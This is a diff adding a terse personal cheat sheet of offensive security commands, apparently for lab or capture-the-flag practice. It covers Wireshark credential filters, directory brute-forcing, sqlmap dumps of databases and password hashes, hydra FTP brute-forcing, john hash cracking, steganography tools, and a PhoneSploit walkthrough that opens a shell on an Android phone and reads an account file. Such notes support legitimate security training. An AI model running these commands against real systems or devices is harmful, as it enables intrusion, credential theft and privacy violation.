@@ -1,0 +1,83 @@
+WIRESHARK:-
+
+1) http.request.method == POST -- For finding creds using wireshark
+
+2) udp.port == 53 -- For DNS filtering (and not tcp)
+
+3) ip.addr == 10.10.10.6 or http and ip.addr == 10.10.10.6 -- to filter out the single IP's with or without http attribute
+
+4) tcp.port == 3389 - also can add not tcp at start to hide rdp ports and display rest -- filters and brings only rdp ports
+
+5) dns.id == 0*f263 -- to filter out the transaction id specifically.(req and response of both the dns id's)(also for creds)
+
+6) dns.qry.type == 16(for text) (this filed only accepts decimal values and not strings.) (creds)
+
+7) ftp -- to filter ftp ports  and ftp-data -- for line based text data or any secret.text content file.(ftp.request too)
+
+Extras:-
+
+1) sudo gzip -d "path".gz -- to extract
+
+2) dirbuster -u http://10.10.241.188 -l /usr/share/wordlists/dirb/common.txt
+
+3) gobuster dir -u 10.10.241.188 -w /usr/share/wordlists/dirb/big.txt
+
+4) gobuster dir -u 10.10.121.51 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -t 100
+
+
+SQLMAP:-
+
+1) sqlmap -u "url?id=1" --dbs or --dump
+
+2) sqlmap dir -r example.txt --dbs --columns --current-user -- for current user 
+
+3)sqlmap dir -r blood.txt --dbs --columns --dump-all
+
+4) sudo sqlmap -r blooda.txt --current-user --is-dba --current-db –hostname  
+
+5) sudo sqlmap -r blooda.txt --users --passwords --privileges --roles  
+  
+
+
+HYDRA:-
+
+1) hydra -l (username) -P (wordlists) ftp://(target IP)
+
+2) ftp (target IP) -- for connecting
+
+3)hydra -L /user.txt -P /password.txt ftp://172.0.16.21
+
+JOHN:-
+
+1) sudo john --format=raw-sha1 or md5 --wordlist(/rockyou.txt) (file.txt)
+
+SNOW TOOL:-
+
+1) SNOW.EXE -C -m "secret message" -p 1234> bro.txt (imp) -- in output don't use>
+
+OPEN STEGO:-
+
+1) (kali㉿kali)-[~/Downloads/openstego/openstego-0.8.5/lib]                                                                                                                                                                                  
+└─$ java -jar openstego.jar
+
+PHONESPLOPIT:-
+
+1)apt-get install adb
+git clone github.com/01010000/phonesploit
+cd phonesploit
+pyhton3 phonesploit.py
+3 (Connect to new phone)
+Add IP address of android device
+4 (Access shell on phone)
+IP address again of android device
+pwd
+ls
+cd sdcard
+ls
+cd downloads
+cat accnt-info.txt
+
+
+
+
+
